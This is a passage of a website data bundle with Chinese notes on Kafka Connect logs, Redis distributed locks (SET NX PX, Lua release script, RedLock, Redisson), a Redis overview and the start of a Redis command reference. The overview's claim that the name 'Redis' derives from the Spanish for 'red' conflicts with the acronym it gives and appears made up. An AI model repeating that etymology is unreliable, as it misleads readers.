(org.apache.kafka.connect.runtime.workersourcetask:478)\n[2021-02-26 15:50:41,050] info workersourcetask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.workersourcetask:495)\n[2021-02-26 15:50:51,051] info workersourcetask{id=local-file-source-0} committing offsets (org.apache.kafka.connect.runtime.workersourcetask:478)\n[2021-02-26 15:50:51,052] info workersourcetask{id=local-file-source-0} flushing 0 outstanding messages for offset commit (org.apache.kafka.connect.runtime.workersourcetask:495)\nfilestreamsourcetask.poll\nfilestreamsourcetask.poll\n[2021-02-26 15:51:01,052] info workersourcetask{id=local-file-source-0} committing offsets (org.apache.kafka.connect.runtime.workersourcetask:478)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nspring boot 接收到消息\n\n@kafkalistener(id = "myid2", topics = "ct")\npublic void listen2(string in) {\n  system.out.println("connect-test"+in);\n}\n\n\n1\n2\n3\n4\n\n\nconnect-test{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"hello"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"},{"schema":{"type":"string","optional":false},"payload":"dsdsa"}\n\n\n1\n\n\n> 每次重启都会消费一次，遗留问题',charsets:{cjk:!0}},{title:"Redis分布式锁介绍",frontmatter:{title:"Redis分布式锁介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1602",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1602.Redis%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E4%BB%8B%E7%BB%8D.html",relativePath:"02.中间件/03.redis/1602.Redis分布式锁介绍.md",key:"v-dcb32594",path:"/redis/1602/",headers:[{level:2,title:"这种方式有几大要点：",slug:"这种方式有几大要点",normalizedTitle:"这种方式有几大要点：",charIndex:382},{level:2,title:"除了要考虑客户端要怎么实现分布式锁之外，还需要考虑redis的部署问题，redis有3种部署方式：",slug:"除了要考虑客户端要怎么实现分布式锁之外-还需要考虑redis的部署问题-redis有3种部署方式",normalizedTitle:"除了要考虑客户端要怎么实现分布式锁之外，还需要考虑 redis 的部署问题，redis 有 3 种部署方式：",charIndex:655},{level:2,title:"另一种方式：Redisson",slug:"另一种方式-redisson",normalizedTitle:"另一种方式：redisson",charIndex:1304},{level:2,title:"对于redis的分布式锁而言，它有以下缺点：",slug:"对于redis的分布式锁而言-它有以下缺点",normalizedTitle:"对于 redis 的分布式锁而言，它有以下缺点：",charIndex:2618}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"这种方式有几大要点： 除了要考虑客户端要怎么实现分布式锁之外，还需要考虑redis的部署问题，redis有3种部署方式： 另一种方式：Redisson 对于redis的分布式锁而言，它有以下缺点：",content:'使用 Redis 做分布式锁的思路大概是这样的：在 redis 中设置一个值表示加了锁，然后释放锁的时候就把这个 key 删除。\n具体代码如下：\n\n// 获取锁\n// NX是指如果key不存在就成功，key存在返回false，PX可以指定过期时间\nSET anyLock unique_value NX PX 30000\n\n\n// 释放锁：通过执行一段lua脚本\n// 释放锁涉及到两条指令，这两条指令不是原子性的\n// 需要用到redis的lua脚本支持特性，redis执行lua脚本是原子性的\nif redis.call("get",KEYS[1]) == ARGV[1] then\nreturn redis.call("del",KEYS[1])\nelse\nreturn 0\nend\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 这种方式有几大要点：\n\n * 一定要用 SET key value NX PX milliseconds 命令\n   如果不用，先设置了值，再设置过期时间，这个不是原子性操作，有可能在设置过期时间之前宕机，会造成死锁 (key 永久存在)\n\n * value 要具有唯一性\n   这个是为了在解锁的时候，需要验证 value 是和加锁的一致才删除 key。\n   这是避免了一种情况：假设 A 获取了锁，过期时间 30s，此时 35s 之后，锁已经自动释放了，A 去释放锁，但是此时可能 B 获取了锁。A 客户端就不能删除 B 的锁了。\n\n\n# 除了要考虑客户端要怎么实现分布式锁之外，还需要考虑 redis 的部署问题，redis 有 3 种部署方式：\n\n * 单机模式\n * master-slave + sentinel 选举模式\n * redis cluster 模式\n\n使用 redis 做分布式锁的缺点在于：如果采用单机部署模式，会存在单点问题，只要 redis 故障了。加锁就不行了。\n\n采用 master-slave 模式，加锁的时候只对一个节点加锁，即便通过 sentinel 做了高可用，但是如果 master 节点故障了，发生主从切换，此时就会有可能出现锁丢失的问题。\n\n基于以上的考虑，其实 redis 的作者也考虑到这个问题，他提出了一个 RedLock 的算法，这个算法的意思大概是这样的：\n假设 redis 的部署模式是 redis cluster，总共有 5 个 master 节点，通过以下步骤获取一把锁：\n\n * 获取当前时间戳，单位是毫秒\n * 轮流尝试在每个 master 节点上创建锁，过期时间设置较短，一般就几十毫秒\n * 尝试在大多数节点上建立一个锁，比如 5 个节点就要求是 3 个节点（n / 2 +1）\n * 客户端计算建立好锁的时间，如果建立锁的时间小于超时时间，就算建立成功了\n * 要是锁建立失败了，那么就依次删除这个锁\n * 只要别人建立了一把分布式锁，你就得不断轮询去尝试获取锁\n\n但是这样的这种算法还是颇具争议的，可能还会存在不少的问题，无法保证加锁的过程一定正确。\n\n\n\n\n# 另一种方式：Redisson\n\n此外，实现 Redis 的分布式锁，除了自己基于 redis client 原生 api 来实现之外，还可以使用开源框架：Redission\n\nRedisson 是一个企业级的开源 Redis Client，也提供了分布式锁的支持。我也非常推荐大家使用，为什么呢？\n\n回想一下上面说的，如果自己写代码来通过 redis 设置一个值，是通过下面这个命令设置的。\n\nSET anyLock unique_value NX PX 30000\n\n\n1\n\n\n这里设置的超时时间是 30s，假如我超过 30s 都还没有完成业务逻辑的情况下，key 会过期，其他线程有可能会获取到锁。\n\n这样一来的话，第一个线程还没执行完业务逻辑，第二个线程进来了也会出现线程安全问题。所以我们还需要额外的去维护这个过期时间，太麻烦了～\n\n我们来看看 redisson 是怎么实现的？先感受一下使用 redission 的爽：\n\nConfig config = new Config();\nconfig.useClusterServers()\n.addNodeAddress("redis://192.168.31.101:7001")\n.addNodeAddress("redis://192.168.31.101:7002")\n.addNodeAddress("redis://192.168.31.101:7003")\n.addNodeAddress("redis://192.168.31.102:7001")\n.addNodeAddress("redis://192.168.31.102:7002")\n.addNodeAddress("redis://192.168.31.102:7003");\n\nRedissonClient redisson = Redisson.create(config);\n\n\nRLock lock = redisson.getLock("anyLock");\nlock.lock();\nlock.unlock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n就是这么简单，我们只需要通过它的 api 中的 lock 和 unlock 即可完成分布式锁，他帮我们考虑了很多细节：\n\n * redisson 所有指令都通过 lua 脚本执行，redis 支持 lua 脚本原子性执行\n * redisson 设置一个 key 的默认过期时间为 30s, 如果某个客户端持有一个锁超过了 30s 怎么办？\n   redisson 中有一个 watchdog 的概念，翻译过来就是看门狗，它会在你获取锁之后，每隔 10 秒帮你把 key 的超时时间设为 30s\n   这样的话，就算一直持有锁也不会出现 key 过期了，其他线程获取到锁的问题了。\n * redisson 的 “看门狗” 逻辑保证了没有死锁发生。\n   如果机器宕机了，看门狗也就没了。此时就不会延长 key 的过期时间，到了 30s 之后就会自动过期了，其他线程可以获取到锁)\n\n\n# 对于 redis 的分布式锁而言，它有以下缺点：\n\n * 它获取锁的方式简单粗暴，获取不到锁直接不断尝试获取锁，比较消耗性能。\n * 另外来说的话，redis 的设计定位决定了它的数据并不是强一致性的 (redis 一直性问题看这里)，在某些极端情况下，可能会出现问题。锁的模型不够健壮\n * 即便使用 redlock 算法来实现，在某些复杂场景下，也无法保证其实现 100% 没有问题，关于 redlock 的讨论可以看 How to do distributed locking\n * redis 分布式锁，其实需要自己不断去尝试获取锁，比较消耗性能。\n\n但是另一方面使用 redis 实现分布式锁在很多企业中非常常见，而且大部分情况下都不会遇到所谓的 “极端复杂场景”\n\n所以使用 redis 作为分布式锁也不失为一种好的方案，最重要的一点是 redis 的性能很高，可以支撑高并发的获取、释放锁操作。\n\nspring boot 整合 redisson 的两种方式：\n自己配置方式：https://www.cnblogs.com/yangzhilong/p/7605807.html\nspring boot starter 方式：https://blog.csdn.net/a1058926697/article/details/116670391',normalizedContent:'使用 redis 做分布式锁的思路大概是这样的：在 redis 中设置一个值表示加了锁，然后释放锁的时候就把这个 key 删除。\n具体代码如下：\n\n// 获取锁\n// nx是指如果key不存在就成功，key存在返回false，px可以指定过期时间\nset anylock unique_value nx px 30000\n\n\n// 释放锁：通过执行一段lua脚本\n// 释放锁涉及到两条指令，这两条指令不是原子性的\n// 需要用到redis的lua脚本支持特性，redis执行lua脚本是原子性的\nif redis.call("get",keys[1]) == argv[1] then\nreturn redis.call("del",keys[1])\nelse\nreturn 0\nend\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 这种方式有几大要点：\n\n * 一定要用 set key value nx px milliseconds 命令\n   如果不用，先设置了值，再设置过期时间，这个不是原子性操作，有可能在设置过期时间之前宕机，会造成死锁 (key 永久存在)\n\n * value 要具有唯一性\n   这个是为了在解锁的时候，需要验证 value 是和加锁的一致才删除 key。\n   这是避免了一种情况：假设 a 获取了锁，过期时间 30s，此时 35s 之后，锁已经自动释放了，a 去释放锁，但是此时可能 b 获取了锁。a 客户端就不能删除 b 的锁了。\n\n\n# 除了要考虑客户端要怎么实现分布式锁之外，还需要考虑 redis 的部署问题，redis 有 3 种部署方式：\n\n * 单机模式\n * master-slave + sentinel 选举模式\n * redis cluster 模式\n\n使用 redis 做分布式锁的缺点在于：如果采用单机部署模式，会存在单点问题，只要 redis 故障了。加锁就不行了。\n\n采用 master-slave 模式，加锁的时候只对一个节点加锁，即便通过 sentinel 做了高可用，但是如果 master 节点故障了，发生主从切换，此时就会有可能出现锁丢失的问题。\n\n基于以上的考虑，其实 redis 的作者也考虑到这个问题，他提出了一个 redlock 的算法，这个算法的意思大概是这样的：\n假设 redis 的部署模式是 redis cluster，总共有 5 个 master 节点，通过以下步骤获取一把锁：\n\n * 获取当前时间戳，单位是毫秒\n * 轮流尝试在每个 master 节点上创建锁，过期时间设置较短，一般就几十毫秒\n * 尝试在大多数节点上建立一个锁，比如 5 个节点就要求是 3 个节点（n / 2 +1）\n * 客户端计算建立好锁的时间，如果建立锁的时间小于超时时间，就算建立成功了\n * 要是锁建立失败了，那么就依次删除这个锁\n * 只要别人建立了一把分布式锁，你就得不断轮询去尝试获取锁\n\n但是这样的这种算法还是颇具争议的，可能还会存在不少的问题，无法保证加锁的过程一定正确。\n\n\n\n\n# 另一种方式：redisson\n\n此外，实现 redis 的分布式锁，除了自己基于 redis client 原生 api 来实现之外，还可以使用开源框架：redission\n\nredisson 是一个企业级的开源 redis client，也提供了分布式锁的支持。我也非常推荐大家使用，为什么呢？\n\n回想一下上面说的，如果自己写代码来通过 redis 设置一个值，是通过下面这个命令设置的。\n\nset anylock unique_value nx px 30000\n\n\n1\n\n\n这里设置的超时时间是 30s，假如我超过 30s 都还没有完成业务逻辑的情况下，key 会过期，其他线程有可能会获取到锁。\n\n这样一来的话，第一个线程还没执行完业务逻辑，第二个线程进来了也会出现线程安全问题。所以我们还需要额外的去维护这个过期时间，太麻烦了～\n\n我们来看看 redisson 是怎么实现的？先感受一下使用 redission 的爽：\n\nconfig config = new config();\nconfig.useclusterservers()\n.addnodeaddress("redis://192.168.31.101:7001")\n.addnodeaddress("redis://192.168.31.101:7002")\n.addnodeaddress("redis://192.168.31.101:7003")\n.addnodeaddress("redis://192.168.31.102:7001")\n.addnodeaddress("redis://192.168.31.102:7002")\n.addnodeaddress("redis://192.168.31.102:7003");\n\nredissonclient redisson = redisson.create(config);\n\n\nrlock lock = redisson.getlock("anylock");\nlock.lock();\nlock.unlock();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n就是这么简单，我们只需要通过它的 api 中的 lock 和 unlock 即可完成分布式锁，他帮我们考虑了很多细节：\n\n * redisson 所有指令都通过 lua 脚本执行，redis 支持 lua 脚本原子性执行\n * redisson 设置一个 key 的默认过期时间为 30s, 如果某个客户端持有一个锁超过了 30s 怎么办？\n   redisson 中有一个 watchdog 的概念，翻译过来就是看门狗，它会在你获取锁之后，每隔 10 秒帮你把 key 的超时时间设为 30s\n   这样的话，就算一直持有锁也不会出现 key 过期了，其他线程获取到锁的问题了。\n * redisson 的 “看门狗” 逻辑保证了没有死锁发生。\n   如果机器宕机了，看门狗也就没了。此时就不会延长 key 的过期时间，到了 30s 之后就会自动过期了，其他线程可以获取到锁)\n\n\n# 对于 redis 的分布式锁而言，它有以下缺点：\n\n * 它获取锁的方式简单粗暴，获取不到锁直接不断尝试获取锁，比较消耗性能。\n * 另外来说的话，redis 的设计定位决定了它的数据并不是强一致性的 (redis 一直性问题看这里)，在某些极端情况下，可能会出现问题。锁的模型不够健壮\n * 即便使用 redlock 算法来实现，在某些复杂场景下，也无法保证其实现 100% 没有问题，关于 redlock 的讨论可以看 how to do distributed locking\n * redis 分布式锁，其实需要自己不断去尝试获取锁，比较消耗性能。\n\n但是另一方面使用 redis 实现分布式锁在很多企业中非常常见，而且大部分情况下都不会遇到所谓的 “极端复杂场景”\n\n所以使用 redis 作为分布式锁也不失为一种好的方案，最重要的一点是 redis 的性能很高，可以支撑高并发的获取、释放锁操作。\n\nspring boot 整合 redisson 的两种方式：\n自己配置方式：https://www.cnblogs.com/yangzhilong/p/7605807.html\nspring boot starter 方式：https://blog.csdn.net/a1058926697/article/details/116670391',charsets:{cjk:!0}},{title:"Redis 介绍",frontmatter:{title:"Redis 介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1600",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1600.Redis%E4%BB%8B%E7%BB%8D.html",relativePath:"02.中间件/03.redis/1600.Redis介绍.md",key:"v-21786cb6",path:"/redis/1600/",headers:[{level:2,title:"Redis的来历",slug:"redis的来历",normalizedTitle:"redis 的来历",charIndex:174},{level:2,title:"为何需要Redis",slug:"为何需要redis",normalizedTitle:"为何需要 redis",charIndex:423},{level:2,title:"Redis的功能",slug:"redis的功能",normalizedTitle:"redis 的功能",charIndex:676},{level:2,title:"Redis的应用场景",slug:"redis的应用场景",normalizedTitle:"redis 的应用场景",charIndex:1139},{level:2,title:"Redis的未来",slug:"redis的未来",normalizedTitle:"redis 的未来",charIndex:1973}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Redis的来历 为何需要Redis Redis的功能 Redis的应用场景 Redis的未来",content:"Redis（REmote DIctionary Server）是一个开源的使用 ANSI C 编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的 API。从名字上看，Redis 的名称来自西班牙的 “红色” 这个词，意味着 “红色灯笼” 或 “红色旗帜”，表示对数据库快速、可扩展、高可靠性的追求。\n\n\n# Redis 的来历\n\nRedis 的诞生可以追溯到 2009 年，当时 Salvatore Sanfilippo（即 antirez）为了解决自己在使用 Memcached 时遇到的一些问题，开始开发 Redis。Memcached 是一个开源的内存中的数据缓存系统，主要用于减少数据库访问次数，以提高网站的访问速度。然而，Sanfilippo 发现 Memcached 的功能过于简单，无法满足一些复杂的需求，如数据持久化和数据同步等。因此，他决定开发一个全新的数据库，以满足这些需求。\n\n\n# 为何需要 Redis\n\n随着互联网的发展，数据量不断增长，传统的关系型数据库在处理大量数据时，性能逐渐下降。同时，随着分布式系统的普及，数据一致性和同步问题也变得越来越突出。Redis 的出现，就是为了解决这些问题。\n\n首先，Redis 是内存数据库，读写速度非常快，可以满足高并发、大数据量的处理需求。其次，Redis 支持多种数据结构，包括字符串、哈希、列表、集合和有序集合等，可以满足各种复杂的业务需求。最后，Redis 还提供了丰富的数据操作和事务控制功能，可以保证数据的一致性和可靠性。\n\n\n# Redis 的功能\n\n 1. 数据结构：Redis 支持多种数据结构，包括字符串、哈希、列表、集合和有序集合等。这些数据结构可以满足各种复杂的业务需求。\n 2. 数据操作：Redis 提供了丰富的数据操作和事务控制功能，包括增加、删除、修改和查询等操作。同时，Redis 还支持事务控制和乐观锁等机制，可以保证数据的一致性和可靠性。\n 3. 数据持久化：Redis 支持多种数据持久化方式，包括 RDB 和 AOF 等。RDB 通过生成数据快照的方式进行持久化，而 AOF 则通过记录操作日志的方式进行持久化。这两种方式都可以保证数据的可靠性和恢复能力。\n 4. 数据同步：Redis 支持主从复制和集群复制两种方式进行数据同步。主从复制可以实现读写分离和负载均衡等功能，而集群复制则可以实现数据的分布式存储和容灾等功能。\n 5. 分布式锁：Redis 提供了分布式锁功能，可以在分布式系统中实现资源共享和并发控制等功能。\n 6. 其他功能：除了上述功能外，Redis 还支持消息队列、发布订阅、Lua 脚本等功能。\n\n\n# Redis 的应用场景\n\n 1.  缓存：Redis 作为内存数据库，读写速度非常快，可以作为缓存层使用。通过将热点数据存储在 Redis 中，可以减少对后端数据库的访问次数，提高网站的访问速度。\n 2.  分布式系统：Redis 支持分布式存储和复制等功能，可以用于构建分布式系统。通过将数据分散到多个节点上存储，可以实现数据的分布式处理和容灾等功能。\n 3.  消息队列：Redis 可以作为消息队列使用，可以实现异步处理和消息的发布订阅等功能。通过将消息存储在 Redis 中，可以实现消息的持久化和可靠传输等功能。\n 4.  数据库扩展：Redis 可以作为数据库的扩展使用，可以实现数据的快速读写和处理等功能。通过将部分数据存储在 Redis 中，可以减轻数据库的压力，提高系统的性能和可靠性。\n 5.  实时分析：Redis 的快速读写能力使其成为实时分析工具的理想选择。它可以作为数据缓冲层，为实时分析提供足够的数据存储空间和查询性能。\n 6.  社交网络：Redis 可以用于实现社交网络中的各种功能，如用户认证、内容发布、好友关系管理等。它的高速读写和丰富的数据结构使得这些操作变得简单高效。\n 7.  游戏开发：在游戏开发中，Redis 可以作为后端服务器的一部分来处理游戏逻辑和玩家数据。它提供的高性能和快速响应使得游戏体验更加流畅。\n 8.  物联网：在物联网应用中，Redis 可以用于存储和管理传感器数据、设备状态等信息。它的持久化和分布式特性使得物联网设备能够可靠地共享和同步数据。\n 9.  缓存网关：Redis 可以作为缓存网关来优化 API 请求的性能。它能够快速地响应 API 请求并减少对后端服务的调用次数，从而提高系统的吞吐量和响应速度。\n 10. 实时推荐系统：在实时推荐系统中，Redis 可以用于存储用户行为数据、商品信息等实时更新的数据。它能够快速地处理推荐算法的计算和查询请求，为用户提供个性化的推荐服务。\n\n\n# Redis 的未来\n\n随着互联网的不断发展，Redis 的应用场景也将越来越广泛。未来，Redis 可能会在以下几个方面有更大的发展：\n\n 1. 分布式系统：随着云计算和大数据技术的发展，分布式系统将更加普及。Redis 作为分布式系统的重要组成部分，将会在数据存储、数据同步和容灾等方面发挥更大的作用。\n 2. 人工智能：人工智能的发展需要大量的数据处理和分析，Redis 的高性能和丰富的数据结构可以满足这些需求。未来，Redis 可能会在人工智能领域有更广泛的应用。\n 3. 物联网：物联网的发展需要大量的数据采集和处理，Redis 的高性能和低延迟可以满足这些需求。未来，Redis 可能会在物联网领域有更广泛的应用。\n 4. 区块链：区块链技术需要大量的数据存储和验证，Redis 的高可靠性和数据持久化可以满足这些需求。未来，Redis 可能会在区块链领域有更广泛的应用。",normalizedContent:"redis（remote dictionary server）是一个开源的使用 ansi c 编写、支持网络、可基于内存亦可持久化的日志型、key-value 数据库，并提供多种语言的 api。从名字上看，redis 的名称来自西班牙的 “红色” 这个词，意味着 “红色灯笼” 或 “红色旗帜”，表示对数据库快速、可扩展、高可靠性的追求。\n\n\n# redis 的来历\n\nredis 的诞生可以追溯到 2009 年，当时 salvatore sanfilippo（即 antirez）为了解决自己在使用 memcached 时遇到的一些问题，开始开发 redis。memcached 是一个开源的内存中的数据缓存系统，主要用于减少数据库访问次数，以提高网站的访问速度。然而，sanfilippo 发现 memcached 的功能过于简单，无法满足一些复杂的需求，如数据持久化和数据同步等。因此，他决定开发一个全新的数据库，以满足这些需求。\n\n\n# 为何需要 redis\n\n随着互联网的发展，数据量不断增长，传统的关系型数据库在处理大量数据时，性能逐渐下降。同时，随着分布式系统的普及，数据一致性和同步问题也变得越来越突出。redis 的出现，就是为了解决这些问题。\n\n首先，redis 是内存数据库，读写速度非常快，可以满足高并发、大数据量的处理需求。其次，redis 支持多种数据结构，包括字符串、哈希、列表、集合和有序集合等，可以满足各种复杂的业务需求。最后，redis 还提供了丰富的数据操作和事务控制功能，可以保证数据的一致性和可靠性。\n\n\n# redis 的功能\n\n 1. 数据结构：redis 支持多种数据结构，包括字符串、哈希、列表、集合和有序集合等。这些数据结构可以满足各种复杂的业务需求。\n 2. 数据操作：redis 提供了丰富的数据操作和事务控制功能，包括增加、删除、修改和查询等操作。同时，redis 还支持事务控制和乐观锁等机制，可以保证数据的一致性和可靠性。\n 3. 数据持久化：redis 支持多种数据持久化方式，包括 rdb 和 aof 等。rdb 通过生成数据快照的方式进行持久化，而 aof 则通过记录操作日志的方式进行持久化。这两种方式都可以保证数据的可靠性和恢复能力。\n 4. 数据同步：redis 支持主从复制和集群复制两种方式进行数据同步。主从复制可以实现读写分离和负载均衡等功能，而集群复制则可以实现数据的分布式存储和容灾等功能。\n 5. 分布式锁：redis 提供了分布式锁功能，可以在分布式系统中实现资源共享和并发控制等功能。\n 6. 其他功能：除了上述功能外，redis 还支持消息队列、发布订阅、lua 脚本等功能。\n\n\n# redis 的应用场景\n\n 1.  缓存：redis 作为内存数据库，读写速度非常快，可以作为缓存层使用。通过将热点数据存储在 redis 中，可以减少对后端数据库的访问次数，提高网站的访问速度。\n 2.  分布式系统：redis 支持分布式存储和复制等功能，可以用于构建分布式系统。通过将数据分散到多个节点上存储，可以实现数据的分布式处理和容灾等功能。\n 3.  消息队列：redis 可以作为消息队列使用，可以实现异步处理和消息的发布订阅等功能。通过将消息存储在 redis 中，可以实现消息的持久化和可靠传输等功能。\n 4.  数据库扩展：redis 可以作为数据库的扩展使用，可以实现数据的快速读写和处理等功能。通过将部分数据存储在 redis 中，可以减轻数据库的压力，提高系统的性能和可靠性。\n 5.  实时分析：redis 的快速读写能力使其成为实时分析工具的理想选择。它可以作为数据缓冲层，为实时分析提供足够的数据存储空间和查询性能。\n 6.  社交网络：redis 可以用于实现社交网络中的各种功能，如用户认证、内容发布、好友关系管理等。它的高速读写和丰富的数据结构使得这些操作变得简单高效。\n 7.  游戏开发：在游戏开发中，redis 可以作为后端服务器的一部分来处理游戏逻辑和玩家数据。它提供的高性能和快速响应使得游戏体验更加流畅。\n 8.  物联网：在物联网应用中，redis 可以用于存储和管理传感器数据、设备状态等信息。它的持久化和分布式特性使得物联网设备能够可靠地共享和同步数据。\n 9.  缓存网关：redis 可以作为缓存网关来优化 api 请求的性能。它能够快速地响应 api 请求并减少对后端服务的调用次数，从而提高系统的吞吐量和响应速度。\n 10. 实时推荐系统：在实时推荐系统中，redis 可以用于存储用户行为数据、商品信息等实时更新的数据。它能够快速地处理推荐算法的计算和查询请求，为用户提供个性化的推荐服务。\n\n\n# redis 的未来\n\n随着互联网的不断发展，redis 的应用场景也将越来越广泛。未来，redis 可能会在以下几个方面有更大的发展：\n\n 1. 分布式系统：随着云计算和大数据技术的发展，分布式系统将更加普及。redis 作为分布式系统的重要组成部分，将会在数据存储、数据同步和容灾等方面发挥更大的作用。\n 2. 人工智能：人工智能的发展需要大量的数据处理和分析，redis 的高性能和丰富的数据结构可以满足这些需求。未来，redis 可能会在人工智能领域有更广泛的应用。\n 3. 物联网：物联网的发展需要大量的数据采集和处理，redis 的高性能和低延迟可以满足这些需求。未来，redis 可能会在物联网领域有更广泛的应用。\n 4. 区块链：区块链技术需要大量的数据存储和验证，redis 的高可靠性和数据持久化可以满足这些需求。未来，redis 可能会在区块链领域有更广泛的应用。",charsets:{cjk:!0}},{title:"Redis命令介绍",frontmatter:{title:"Redis命令介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/redis/1601",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1601.Redis%E5%91%BD%E4%BB%A4%E4%BB%8B%E7%BB%8D.html",relativePath:"02.中间件/03.redis/1601.Redis命令介绍.md",key:"v-d6189198",path:"/redis/1601/",headers:[{level:2,title:"公用命令",slug:"公用命令",normalizedTitle:"公用命令",charIndex:2},{level:2,title:"处理时间",slug:"处理时间",normalizedTitle:"处理时间",charIndex:384},{level:2,title:"自增和自减",slug:"自增和自减",normalizedTitle:"自增和自减",charIndex:776},{level:2,title:"字符串 String",slug:"字符串-string",normalizedTitle:"字符串 string",charIndex:1002},{level:2,title:"列表 list",slug:"列表-list",normalizedTitle:"列表 list",charIndex:1660},{level:2,title:"集合 set",slug:"集合-set",normalizedTitle:"集合 set",charIndex:3448},{level:2,title:"散列 hash 哈希类型",slug:"散列-hash-哈希类型",normalizedTitle:"散列 hash 哈希类型",charIndex:4473},{level:2,title:"有序集合 zset",slug:"有序集合-zset",normalizedTitle:"有序集合 zset",charIndex:5078},{level:2,title:"订阅/发布",slug:"订阅-发布",normalizedTitle:"订阅 / 发布",charIndex:6386},{level:2,title:"Redis5 之 Streams 数据类型",slug:"redis5-之-streams-数据类型",normalizedTitle:"redis5 之 streams 数据类型",charIndex:6673},{level:3,title:"streams数据结构",slug:"streams数据结构",normalizedTitle:"streams 数据结构",charIndex:7170},{level:3,title:"streams基础",slug:"streams基础",normalizedTitle:"streams 基础",charIndex:7409},{level:3,title:"streams命令",slug:"streams命令",normalizedTitle:"streams 命令",charIndex:7646},{level:3,title:"streams三种查询模式",slug:"streams三种查询模式",normalizedTitle:"streams 三种查询模式",charIndex:9790}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"公用命令 处理时间 自增和自减 字符串 String 列表 list 集合 set 散列 hash 哈希类型 有序集合 zset 订阅/发布 Redis5 之 Streams 数据类型 streams数据结构 streams基础 streams命令 streams三种查询模式",content:'# 公用命令\n\n可以删除任意数据结构的 key\n\ndel key \n\n\n1\n\n\n查看所有 key\n\nkeys *\n\n\n1\n\n\n根据给定的选项，对输入列表、集合或者有序集合进行排序，然后返回或者存储排序的结果。\n\nsort source-key [by pattern] [limit offset count] [get pattern [get pattern ...]] [asc|desc] [alpha] [store dest-key] \n\n\n1\n\n\n查看数据库有多少个 key\n\ndbsize\n\n\n1\n\n\n清除所有库的数据\n\nflushall\n\n\n1\n\n\n清除当前库的所有数据\n\nflushdb\n\n\n1\n\n\n查看 reids 内存信息等\n\ninfo\n\n\n1\n\n\n监控所有客户发送的命令（redis 编译执行成功的命令）\n\nmonitor\n\n\n1\n\n\n\n# 处理时间\n\n移除键的过期时间\n\npersist key \n\n\n1\n\n\n查看给定键距离过期还有多少秒\n\nttl key \n\n\n1\n\n\n给定键在指定的秒数后过期\n\nexpire key seconds \n\n\n1\n\n\n将给定键的过期时间设置为给定的 unix 时间戳\n\nexpireat key timestamp\n\n\n1\n\n\n查看给定键距离过期时间还有多少毫秒，这个命令在 reids2.6 以上版本可用。\n\npttl key \n\n\n1\n\n\n让给定键在指定的毫秒数之后过期，这个命令在 redis2.6 以上版本可用。\n\npexpire key milliseconds \n\n\n1\n\n\n将一个毫秒级精度的 unix 时间戳设置为给定键的过期时间，这个命令在 redis2.6 以上版本可用。\n\npexpireat key timestamp-milliseconds \n\n\n1\n\n\n\n# 自增和自减\n\n将键存储的值 + 1\n\nincr key \n\n\n1\n\n\n将键存储的值 - 1\n\ndecr key \n\n\n1\n\n\n将键存储的值加上整数 amount\n\nincrby key amount \n\n\n1\n\n\n将键存储的值减去整数 amount\n\ndecrby key amount \n\n\n1\n\n\n将键存储的值加上浮点数 amount，这个命令在 Redis2.6 以上版本可用\n\nincrbyfloat key amount \n\n\n1\n\n\n\n# 字符串 String\n\n可以是字符串（简单的字符串、复杂的字符串（例如 JSON、XML））、数字（整数、浮点数），甚至是二进制（图片、音频、视频），但是值最大不能超过 512MB\n\n创建一个键值对 set key value\n\n127.0.0.1:6379> set a 1234567890\nOK\n\n\n1\n2\n\n\n获取 key 存储的值 get key\n\n127.0.0.1:6379> get a\n"1234567890"\n\n\n1\n2\n\n\n将值 value 追加到给定 key 当前存储的值的末尾，追加成功的发返回值为这个字符串的长度 (length) append key value\n\n127.0.0.1:6379> append a a\n(integer) 11\n127.0.0.1:6379> get a\n"1234567890a"\n\n\n1\n2\n3\n4\n\n\n获取一个由偏移量 start 至 end 范围内的所有字符组成的字串，包括 start 和 end 在内。getrange key start end\n\n127.0.0.1:6379> getrange a 0 3\n"1234"\n\n\n1\n2\n\n\n将从 start 偏移量开始的字串设置为给定值 setrange key offset value\n\n127.0.0.1:6379> setrange a 3 bcde\n(integer) 11\n127.0.0.1:6379> get a\n"123bcde890a"\n\n\n1\n2\n3\n4\n\n\n\n# 列表 list\n\n用来存储多个有序的字符串，列表中的每个字符串称为元素（element），一个列表最多可以存储 2^32 -1 个元素\n\n将一个或多个值推入列表的右端 rpush key value [...]\n\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n127.0.0.1:6379> RPUSH b 7 8\n(integer) 4\n127.0.0.1:6379> LRANGE b 0 -1\n1) "5"\n2) "6"\n3) "7"\n4) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n获取 list 元素数量 llen\n\n127.0.0.1:6379[1]> llen 32021420001:90000300009999:10002:1601198414621\n(integer) 2\n\n\n1\n2\n\n\nlpush key value [...] -> 将一个或多个值推入列表的左端\n\n127.0.0.1:6379> LPUSH b 1 2\n(integer) 6\n127.0.0.1:6379> LRANGE b 0 -1\n1) "2"\n2) 